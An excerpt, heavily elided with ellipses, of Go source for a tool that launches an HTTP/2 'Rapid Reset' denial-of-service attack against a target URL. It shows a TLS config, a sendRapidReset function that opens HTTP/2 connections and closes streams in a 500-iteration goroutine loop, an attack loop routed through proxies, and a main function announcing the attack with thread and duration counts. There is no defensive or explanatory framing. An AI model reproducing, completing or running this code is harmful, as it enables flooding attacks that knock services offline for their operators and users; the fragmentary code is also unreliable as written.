...
func createTLSConfig() *tls.Config {
    return &tls.Config{
        ...
        MinVersion:         tls.VersionTLS12, // HTTP/2 requires at least TLS 1.2
...
func sendRapidReset(proxyAddr, target string) {
    ...
    transport := &http2.Transport{
        ...
        DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
            return tls.Dial(network, parsedURL.Host+":443", cfg)
        },
    }
    ...
    for i := 0; i < 500; i++ {
        ...
        go func() {
            ...
            if h2conn, ok := resp.Body.(io.Closer); ok {
                h2conn.Close()
            }
        }()
    }
...
func attack(wg *sync.WaitGroup, stopChan chan struct{}) {
    ...
    for {
        ...
        default:
            ...
            sendRapidReset(proxy, targetURL)
...
func main() {
    ...
    fmt.Printf("Starting HTTP/2 Rapid Reset attack on %s with %d threads for %d seconds\n", targetURL, threads, duration)
